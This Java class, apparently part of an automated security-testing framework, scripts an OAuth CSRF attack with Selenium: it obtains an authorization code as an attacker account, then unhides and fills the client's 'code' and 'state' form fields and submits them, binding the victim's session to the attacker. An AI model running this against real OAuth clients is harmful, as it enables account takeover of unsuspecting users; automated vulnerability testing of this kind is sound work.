package com.gsf.executor.api.task;

import com.gsf.executor.api.entity.UserTemplate;
import com.gsf.executor.api.repository.UserTemplateMemoryRepository;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;

public class OAuthCSRFAttackTask extends GenericTask {

    public OAuthCSRFAttackTask(){}

    public OAuthCSRFAttackTask(UserTemplate client) {
        super(client);
    }

    @Override
    public void executeTask(UserTemplate user) {
        LOGGER.info("OAuthCSRFAttackTask Init "+ user);

        seleniumConfig.initDriver();

        UserTemplate userAttacker = UserTemplateMemoryRepository.findById(50);

        if (user.getAs().equalsIgnoreCase("fiwarelab")) {
            userAttacker = user;
        } else {
            userAttacker.setAs(user.getAs());
        }


        accessClient(userAttacker);

        String currentUrl = createAttackRequest(seleniumConfig.getCurrentUrl());
        seleniumConfig.get(currentUrl);
        accessAuthorisationServer(userAttacker, currentUrl);

        if(!hasErrors()) {
            String code = extractValue(seleniumConfig.getCurrentUrl(), "code");

            //envia link para vitima
            seleniumConfig.get(user.getSiteUrl()+"/csrf");

            JavascriptExecutor jse = (JavascriptExecutor)seleniumConfig.getDriver();
            jse.executeScript("document.getElementsByName('code')[0].setAttribute('type', 'text');");
            seleniumConfig.getDriver().findElement(By.xpath("//input[@name='code']")).clear();
            seleniumConfig.getDriver().findElement(By.xpath("//input[@name='code']")).sendKeys(code);
            jse.executeScript("document.getElementsByName('code')[0].setAttribute('type', 'hidden');");

            jse = (JavascriptExecutor)seleniumConfig.getDriver();
            jse.executeScript("document.getElementsByName('state')[0].setAttribute('type', 'text');");
            seleniumConfig.getDriver().findElement(By.xpath("//input[@name='state']")).clear();
            seleniumConfig.getDriver().findElement(By.xpath("//input[@name='state']")).sendKeys("csrf_state");
            jse.executeScript("document.getElementsByName('state')[0].setAttribute('type', 'hidden');");

            seleniumConfig.getDriver().findElement(By.xpath(".//button[@type='submit']")).click();
        }

        seleniumConfig.close();

        LOGGER.info("OAuthCSRFAttackTask End  "+ user);
    }

}
